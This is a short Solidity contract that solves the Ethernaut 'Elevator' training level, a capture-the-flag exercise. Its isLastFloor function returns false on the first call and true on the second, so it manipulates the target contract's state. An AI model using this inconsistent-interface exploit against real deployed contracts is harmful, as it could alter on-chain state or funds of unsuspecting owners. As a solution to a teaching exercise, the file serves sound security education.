// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../ethernaut/levels/Elevator.sol';

contract ElevatorSolution is Building {
    bool private isLastFloorCalled;
    Elevator target;
    constructor(address targetAddress) {
      isLastFloorCalled = false;
      target = Elevator(targetAddress);
    }

    function goTo() public {
      target.goTo(0);
    }

    function isLastFloor(uint) external override returns (bool) {
      if (!isLastFloorCalled) {
        isLastFloorCalled = true;
        return false;
      }
      return true;
    }
}